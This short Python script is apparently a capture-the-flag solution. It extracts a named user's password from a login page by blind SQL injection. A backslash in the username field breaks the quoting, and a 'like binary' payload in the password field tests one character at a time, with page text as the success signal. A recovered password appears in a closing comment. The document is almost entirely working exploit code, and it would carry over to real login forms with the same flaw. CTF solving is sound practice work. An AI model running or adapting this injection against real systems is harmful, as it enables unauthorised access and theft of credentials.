import requests
import string

url = 'http://ctf.sharif.edu:8082/login.php'
password=''

possible=''
for c in range(32,128):
	if not (chr(c)=='%' or chr(c)=='_'):
		possible+=chr(c)

possible+='_'

found = False

for i in range(40):
	found = False
	for c in possible:
		print 'trying : ',c
		attack = "or (username='Cuchulainn' and password like binary '"+password+c+"%') -SLEEP(0.001);#"
		r = requests.post(url, data = {'username':'\\', 'password' : attack})
		#Notice is a word present on the page, opened after successful login
		if ('Notice' in r.text):
			found = True
			print 'Found : ',c
			password+=c
			print 'password : ',password
			break
	# no matche, so end of the password
	if not (found):
		break


#2a7da9c@088ba43a_9c1b4Xbyd231eb9